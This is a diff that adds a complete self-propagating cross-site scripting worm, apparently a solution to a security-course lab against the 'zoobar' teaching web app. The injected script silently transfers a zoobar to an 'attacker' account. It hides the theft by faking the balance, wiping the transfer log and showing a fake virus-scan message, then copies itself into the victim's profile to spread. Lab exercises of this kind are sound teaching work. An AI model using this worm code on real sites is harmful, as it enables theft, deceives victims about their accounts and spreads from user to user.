@@ -1,0 +1,31 @@
+</div> <script id="bad-script">
+
+/* Steal 1 zoobar! */
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://localhost:8080/zoobar/index.cgi/transfer', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+xhr.send('zoobars=1&recipient=attacker');
+
+/* Hide our tracks */
+window.onload = function () {
+    /* Only display 10 zoobars for us */
+    total = 10;
+    
+    /* No transfer logs */
+    var tables = document.querySelectorAll('table.log');
+    tables[0].innerHTML='\n<thead>\n<tr><th>Time</th>\n <th>Sender</th>\n <th>Recipient</th>\n <th>Amount</th></tr>\n</thead>\n<tbody></tbody>'
+
+    document.getElementById('profile').innerHTML = '<b>Scanning for viruses...</b>';
+}
+
+/* Infect the victim! */
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://localhost:8080/zoobar/index.cgi/', true);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+var replicate = "</di"+"v> <script id='bad-script'>" + "\n" + document.getElementById("bad-script").innerHTML + "\n" + "</scr" + "ipt>";
+
+xhr.send('profile_update=' + encodeURIComponent(replicate));
+
+</script>
